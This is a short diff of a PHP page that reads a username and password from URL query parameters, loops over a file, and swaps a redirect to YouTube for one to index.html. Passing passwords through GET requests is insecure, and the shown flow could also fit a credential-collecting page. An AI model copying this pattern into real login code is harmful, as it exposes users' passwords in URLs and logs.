@@ -1,7 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <?php
-header('Location:https://www.youtube.com/');
+
 $username = $_GET["username"];
 $password = $_GET["password"];
 
@@ -23,7 +23,7 @@ while (! feof($my_file)) {
     }
 }
 
-
+header("Location: index.html");
 
 ?>
 </html>
